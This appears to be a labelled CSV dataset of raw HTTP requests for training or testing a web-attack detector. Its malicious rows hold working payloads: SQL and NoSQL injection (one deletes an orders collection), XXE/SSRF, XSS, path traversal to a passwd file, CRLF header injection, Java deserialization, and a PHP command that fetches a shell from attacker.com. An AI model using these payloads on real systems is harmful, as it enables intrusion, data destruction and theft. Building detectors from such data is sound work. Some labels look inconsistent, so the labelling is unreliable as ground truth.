label,text
benign,"PATCH /api/v2/clients/995/folder/34 HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Content-Type: application/json-patch+json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Mobile Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

[
  {""op"": ""move"", ""from"": ""/documents/0"", ""path"": ""/documents/2""},
  {""op"": ""copy"", ""from"": ""/metadata/createdBy"", ""path"": ""/metadata/lastModifiedBy""}
]"
benign,"GET /news/technology/innovative-gadgets-2024 HTTP/1.1
Host: tech-updates-world.net
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: close"
malicious,"POST /service/api/v3/data/submit HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/xml
Content-Length: 205
Cache-Control: no-cache
Connection: close

<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE request [
<!ENTITY xxe_ssrf SYSTEM ""http://10.0.0.5:5000/debug_info"" >
]>
<request>
  <payload>&xxe_ssrf;</payload>
</request>"
benign,"GET /images/2024/gallery/cover-photo.jpg HTTP/1.1
Host: media-streaming-services.tv
DNT: 1
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"
benign,"GET /recipes/find?ingredient=tomato&ingredient=basil&ingredient=mozzarella&diet=vegetarian HTTP/1.1
Host: freshfoodcorner.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
malicious,"POST /user/profile/update HTTP/1.1
Host: portal.secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Origin: https://portal.secure-user-portal.net
Referer: https://portal.secure-user-portal.net/user/profile
Cookie: sessionid=abcde12345fghij67890klmnop
Content-Length: 59

display_name=John+Doe&bio=Love+coding&search_term=summer_sale']};db.orders.remove({}); //"
benign,"GET /api/v1/analytics/events?event_type=page_view&country=IE&start_date=2024-04-01&end_date=2024-04-30 HTTP/1.1
Host: stats-insights.my-personal-blog-site.info
Accept: application/json
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip"
benign,"POST /user/forgot_password HTTP/1.1
Host: digital-arts-portal.uk
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Referer: https://digital-arts-portal.uk/login

email=oliver.green%40digitalartsportal.uk"
benign,"GET /api/v1/user/profile HTTP/1.1
Host: example.com:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.9
Referer: https://example.com:8080/login
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: close"
benign,"GET /static/v1/fonts/pt-sans-regular.woff2 HTTP/1.1
Host: media-streaming-network.org
Connection: keep-alive
Accept: font/woff2,application/font-woff2,*/*;q=0.9
Referer: https://media-streaming-network.org/css/player-theme.css
Origin: https://media-streaming-network.org
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.5"
benign,"DELETE /api/v1/employees/55987 HTTP/1.1
Host: corp-hr-management.info
Authorization: Bearer AChxfYp8RmzZu91J34ketLVbREqdT0ngjsv52oqF
Accept: application/json
DNT: 1
User-Agent: curl/7.76.1
Connection: close"
malicious,"POST /user/submit-feedback HTTP/1.1
Host: feedback-panel.it-solutions.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 133

name=Jessica+Moretti&email=jessica.moretti%40mail.it-solutions.biz&feedback=Great+site%21+%3C%3Fphp+echo+shell_exec%28%27wget+http%3A%2F%2Fattacker.com%2Fshell.php+-O+/tmp/sh.php%27%29%3B+%3F%3E"
malicious,"PUT /object/submit HTTP/1.1
Host: orchestration.enterprise-infra.network
User-Agent: Java/1.8.0_291
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Content-Length: 287

{
  ""object_data"": ""rO0ABXNyABpvcmcubGFuZy5PYmplY3QAAAAAAAAAAQIAA0kAA2tleXQAFkxqYXZhL2xhbmcvU3RyaW5nO3hwc3IAA29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXIAAAABAgABTAAFZnVuY3RlclYABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHIAHmphdmEubGFuZy5SdW50aW1lAARleGVjAAZzdWJwcm9jZXNz""
}"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: reports.analytics-dashboard.io
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
DNT: 1
User-Agent: python-requests/2.31.0
Connection: keep-alive"
malicious,"GET /user/preferences HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Cookie: session_filter=(uid=adminuser%00; prefs=darkmode:true"
malicious,"GET /forum/post/view?post=123&%70%6F%73%74=456%27%20OR%20%271%27=%271 HTTP/1.1
Host: tech-talks-community.dev
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: br, gzip
Pragma: no-cache"
malicious,"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: br, gzip, deflate
Referer: https://online-retail-store.biz/home
Cookie: sid=Ux3z07PlB06QbNzCNo46zJJX7"
malicious,"POST /cms/plugin_config HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml;q=0.9,application/xml;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Referer: https://secure-user-portal.net/cms/plugin_config
Content-Length: 230

gadget_chain_b64=TzozNjoiTW9ub2xvZ1xMYWNrU3FscExvZ2dlciI6MTp7czozOiJsb2ciO3M6MzE6IltTeXNUcmFjZV09PSdmIl0gc3VwcmlzZXMgZXhwbG9pdCI7fQ=="
benign,"PUT /api/v1/employee/1903 HTTP/1.1
Host: hr-management.acme-corp-internal.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.dXNlcklkOjE5MDM.MvrnED5vJVltjTYPKHh92HgL4q9ed1fKEjwP4xLP6BkQ
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Length: 164

{""employeeId"":1903,""name"":""Carlos Mendoza"",""position"":""Product Manager"",""department"":""Product Development"",""email"":""carlos.mendoza@acme-corp-internal.com"",""active"":true}"
benign,"GET /search/results?query=top+100+travel+destinations+to+visit+in+2024+including+hidden+gems+and+popular+urban+locations+with+cultural+events+all+year+round+for+family+friendly+vacations+and+solo+adventures HTTP/1.1
Host: wanderlust-adventures.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"POST /contact/support HTTP/1.1
Host: helpdesk-techsolutions.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Connection: keep-alive

message=Our+team+needs+to+better+understand+how+SELECT+queries+retrieve+data+based+on+the+WHERE+conditions."
benign,"POST /resource/submit HTTP/1.1
Host: api.smart-environment.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 508
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.sessiontoken12345
Cache-Control: no-cache

sensorId=77&temp=22.8&humidity=45&pressure=1012&light=320&noise=15&co2=400&pm25=12&pm10=25&battery=95&signalStrength=-80&location=45.1234%2C-93.1234&status=active&firmwareVersion=2.4.5&lastMaintenance=2024-05-01&uptimeHours=1245&alertsEnabled=yes&dataInterval=15min&uploadSuccess=1&sensorModel=X300&region=Midwest&resetCount=0&calibrationDate=2023-12-10&notes=All+systems+normal&adminOverride=no"
malicious,"POST /api/v2/report/generate HTTP/1.1
Host: analytics.internal-dashboard.io
Content-Type: application/json
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 74

{""reportUrl"":""http://2130706433/admin/dashboard?refresh=true&user=admin""}"
benign,"POST /auth/password/reset-request HTTP/1.1
Host: secure-cloud-solutions.net
Accept: application/json
Content-Type: application/json
X-Forwarded-For: 203.0.113.58
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Language: en-US,en;q=0.5
Content-Length: 56

{""email"":""maria.gonzalez@secure-cloud-solutions.net""}"
benign,"GET /blog/articles?title=Comprehensive+overview+of+renewable+energy+solutions+including+solar+panels%2C+wind+turbines%2C+and+hydroelectric+systems HTTP/1.1
Host: green-energy-journal.org
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Connection: close
Referer: https://green-energy-journal.org/"
malicious,"GET /reports/view HTTP/1.1
Host: analytics.enterprise-solutions.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
Accept-Encoding: br, gzip, deflate
Upgrade-Insecure-Requests: 1
Cookie: report_template=../../../../etc/mail/passwd%00template; session=8d946c7bdcf31a92"
benign,"GET / HTTP/1.1
Host: metropolitan-travel-guide.org
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate
X-Forwarded-For: 66.249.66.1
Connection: keep-alive"
benign,"POST /event/register HTTP/1.1
Host: vibrant-events-calendar.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Referer: https://vibrant-events-calendar.com/events/spring-festival-2024
Cookie: sessid=3b7dce20a77948a18259ba8c9ea2f0b1

first_name=Lucas&last_name=Nguyen&email=lucas.nguyen%40mailfast.com&event_id=512&csrf_token=b81d135c4e9f4a2292f50d1a6e2f4468&form_id=event_registration&timestamp=1685704599&return_url=%2Fevents%2Fthanks"
benign,"PUT /api/blog/posts/542 HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer gG12hiYXCVbnEWZmAWu196AQOSRfzpgD4yHdTlFS
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive

{""id"":542,""title"":""Exploring Rust for Web Development"",""slug"":""exploring-rust-for-web"",""content"":""This article walks through getting started with Rust in web apps, including tooling and examples."",""tags"":[""rust"",""webdev"",""programming""],""published"":true}"
benign,"GET /api/v1/vehicles/9482398 HTTP/1.1
Host: urban-transport-hub.me
Accept: application/json
Authorization: Bearer mF_9.B5f-4.1JqM
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /api/v3/items/search HTTP/1.1
Host: marketplace.smart-things-store.io
Content-Type: application/json
Accept: application/json
Origin: https://marketplace.smart-things-store.io
X-Requested-With: FetchAPIClient
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.Zm9vLmJhcg._rYdhc65xibRslEAF6LD9JLR_G-10dK6pFG4GJ9VI14
X-CSRF-Token: 88x12b7f9d38407f87eac51751615501
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Cache-Control: no-store

{""query"":""wireless headphones"",""filters"":{""brand"":[""BrandX"",""SoundTech""],""priceRange"":{""min"":50,""max"":150}},""sort"":""popularity""}"
malicious,"GET /xml_api/search_books?book_title=Lord%20of%20the%20Rings%27%20or%20%271%27%3D%271%20or%20%271%27%3D%271 HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
malicious,"POST /app/user/settings HTTP/1.1
Host: nextgen-ai-platform.dev
X-Forwarded-For: 172.16.254.1%0d%0aInjected-Header:%20InjectedValue
User-Agent: Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/90.0.4430.212%20Safari/537.36
Content-Type: application/json
Accept: application/json
Content-Length: 38

{""theme"":""dark"",""notifications"":true}"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/json
Accept: application/json
X-Debug-Mode: enabled
Content-Length: 32

{""search"":""laptop"",""page"":1}"
benign,"POST /user/preferences/update HTTP/1.1
Host: wellness-community.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Accept: text/html,application/xhtml+xml
Origin: https://wellness-community.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive

notifications=email&notifications=sms&theme=dark"
benign,"GET /static/v1/images/background.jpg HTTP/1.1
Host: community.game-dev-forum.org
Accept: image/webp,image/apng,image/*,*/*;q=0.8
If-None-Match: W/""167f00cd3d""
Cache-Control: no-cache
Connection: keep-alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.134 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9"
benign,"GET /api/v4/weather/data?city=Hamburg&unit=metric HTTP/1.1
Host: weather-data-hub.net
Accept: application/json
Authorization: ApiKey 9c4a7f2d54b5836e11cae7f03489b218
X-Requested-With: XMLHttpRequest
Origin: https://weather-dashboard.weather-data-hub.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Cache-Control: no-cache"
benign,"HEAD /api/v1/status HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
malicious,"POST /form/submit/signature HTTP/1.1
Host: advanced-token-authentication.securityhub.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept-Language: en-US,en;q=0.7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 205

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ"
malicious,"GET /redirect?url=//secure-login-service.net/%2F%2E%2E%2Fphishersite.biz HTTP/1.1
Host: secure-login-service.net
User-Agent: Python-urllib/3.9
Accept: */*
Connection: close"
malicious,"GET /blog/author/<ImG sRc=x oNeRrOr=prompt(1)>/posts HTTP/1.1
Host: modern-coder-collective.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Referer: https://modern-coder-collective.net/blog
Cache-Control: no-cache
Connection: close"
benign,"GET /resources/js/vendor/moment.min.js HTTP/1.1
Host: smartdata-visuals.ai
Accept: application/javascript,text/javascript;q=0.9,*/*;q=0.1
User-Agent: HTTPie/3.1.1
Accept-Encoding: gzip, deflate, br
Connection: close"
benign,"POST /v1/accounts/reset-password HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Content-Type: application/json
Authorization: Bearer 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept-Language: en-GB,en;q=0.9
Content-Length: 47

{""email"":""dylan.greer@api.cloud-data-services.ai""}"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: management-portal.infra-corp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15
Content-Type: application/json-patch+json
Accept: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.http.payload.signature
Content-Length: 72
Connection: keep-alive

[{""op"": ""replace"", ""path"": ""/notifications/email"", ""value"": false}]"
benign,"GET /news/world/peace-summit-2024-preview HTTP/1.1
Host: globe-insight.ai
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html;q=0.9,application/xhtml+xml;q=0.8
Accept-Encoding: gzip
Cache-Control: no-cache
Connection: close"
